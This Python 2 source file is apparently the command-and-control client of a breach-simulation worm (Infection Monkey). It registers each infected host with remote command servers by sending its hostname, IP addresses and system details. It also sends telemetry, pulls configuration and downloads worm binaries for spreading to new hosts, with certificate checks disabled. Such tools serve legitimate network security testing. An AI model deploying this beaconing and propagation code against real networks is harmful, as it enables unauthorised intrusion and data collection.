
import json
import random
import logging
import requests
import platform
import monkeyfs
from network.info import local_ips
from socket import gethostname, gethostbyname_ex
from config import WormConfiguration, Configuration, GUID

__author__ = 'hoffer'

requests.packages.urllib3.disable_warnings()

LOG = logging.getLogger(__name__)
DOWNLOAD_CHUNK = 1024

class ControlClient(object):

    @staticmethod
    def wakeup(parent=None):
        for server in WormConfiguration.command_servers:
            try:
                hostname = gethostname()
                if None == parent:
                    parent = GUID

                WormConfiguration.current_server =  server                

                monkey = {  'guid': GUID,
                            'hostname' : hostname,
                            'ip_addresses' : local_ips(),
                            'description' : " ".join(platform.uname()),
                            'config' : WormConfiguration.as_dict(),
                            'parent' : parent
                }
                
                reply = requests.post("https://%s/api/monkey" % (server,), 
                                        data=json.dumps(monkey),
                                        headers={'content-type' : 'application/json'},
                                        verify=False)
                
                break

            except Exception, exc:
                LOG.warn("Error connecting to control server %s: %s",
                         server, exc)

    @staticmethod
    def keepalive():
        try:
            reply = requests.patch("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID), 
                                    data=json.dumps({}),
                                    headers={'content-type' : 'application/json'},
                                    verify=False)
        except Exception, exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)
            return {}

    @staticmethod
    def send_telemetry(tele_type='general',data=''):
        try:
            telemetry = {'monkey_guid': GUID, 'telem_type': tele_type, 'data' : data}
            reply = requests.post("https://%s/api/telemetry" % (WormConfiguration.current_server,), 
                                    data=json.dumps(telemetry),
                                    headers={'content-type' : 'application/json'},
                                    verify=False)

        except Exception, exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)

    @staticmethod
    def load_control_config():
        try:
            reply = requests.get("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID), verify=False)

        except Exception, exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)
            return

        try:
            WormConfiguration.from_dict(reply.json().get('config'))
        except Exception, exc:
            LOG.warn("Error parsing JSON reply from control server %s (%s): %s",
                     WormConfiguration.current_server, reply._content, exc)

    @staticmethod
    def download_monkey_exe(host):
        try:
            reply = requests.post("https://%s/api/monkey/download" % (WormConfiguration.current_server,), 
                                    data=json.dumps(host.as_dict()),
                                    headers={'content-type' : 'application/json'},
                                    verify=False)

            if 200 == reply.status_code:
                result_json = reply.json()
                filename = result_json.get('filename')
                if not filename:
                    return None
                size = result_json.get('size')
                dest_file = monkeyfs.virtual_path(filename)
                if monkeyfs.isfile(dest_file) and size == monkeyfs.getsize(dest_file):
                    return dest_file
                else:
                    download = requests.get("https://%s/api/monkey/download/%s" % (WormConfiguration.current_server, filename),
                                                verify=False)
                    with monkeyfs.open(dest_file, 'wb') as file_obj:
                        for chunk in download.iter_content(chunk_size=DOWNLOAD_CHUNK):
                            if chunk:
                                file_obj.write(chunk)
                        file_obj.flush()
                    if size == monkeyfs.getsize(dest_file):
                        return dest_file

        except Exception, exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)
        
        return None

